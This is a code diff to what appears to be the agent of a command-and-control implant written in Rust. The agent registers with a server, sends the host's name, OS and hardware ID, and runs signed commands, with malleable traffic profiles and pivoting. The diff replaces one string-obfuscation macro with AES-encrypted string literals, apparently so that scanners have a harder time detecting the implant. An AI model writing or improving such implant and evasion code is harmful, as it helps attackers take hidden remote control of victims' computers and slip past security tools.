@@ -32,7 +32,8 @@ use zeroize::Zeroize;
 use crate::common::{ClientHello, SecuredCommand, PivotFrame, C2Config, MalleableProfile};
 use crate::utils;
 use crate::transport::ClientTransport;
-use crate::lc;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use crate::traffic::DataMolder;
 
 use self::handlers::{HandlerContext, AgentAction};
@@ -227,7 +228,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
 
     let server_pub = BASE64.decode(&config.server_public_key)?;
     let pub_bytes: [u8; 32] = server_pub.try_into()
-        .map_err(|_| "Invalid server public key length (expected 32 bytes)")?;
+        .map_err(|_| aes_str!("Invalid server public key length (expected 32 bytes)"))?;
     let verify_key = VerifyingKey::from_bytes(&pub_bytes)?;
 
     if config.debug {
@@ -326,7 +327,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
             let reg_ts = chrono::Utc::now().to_rfc3339();
             let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
             let hello = ClientHello {
-                hostname: hostname::get().unwrap_or(lc!("unknown").into()).to_string_lossy().into(),
+                hostname: hostname::get().unwrap_or(aes_str!("unknown").into()).to_string_lossy().into(),
                 os: std::env::consts::OS.to_string(),
                 computer_id: hwid.clone(),
                 exe_id: exe_id.clone(),
@@ -459,7 +460,7 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
 
                 if verify_key.verify(&sign_bytes, &sig).is_ok() {
                     last_counter = msg.counter;
-                    if msg.command == lc!("exit") { return Ok(()); }
+                    if msg.command == aes_str!("exit") { return Ok(()); }
 
                     let ctx = HandlerContext {
                         proxy_handle: proxy_handle.clone(),
@@ -531,7 +532,7 @@ async fn run_http_mode(
     let reg_ts = chrono::Utc::now().to_rfc3339();
     let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
     let hello = ClientHello {
-        hostname: hostname::get().unwrap_or(lc!("unknown").into()).to_string_lossy().into(),
+        hostname: hostname::get().unwrap_or(aes_str!("unknown").into()).to_string_lossy().into(),
         os: std::env::consts::OS.to_string(),
         computer_id: hwid.clone(),
         exe_id: exe_id.clone(),
@@ -713,7 +714,7 @@ async fn process_http_command(
 
     *last_counter = cmd.counter;
 
-    if cmd.command == lc!("exit") {
+    if cmd.command == aes_str!("exit") {
         std::process::exit(0);
     }
 
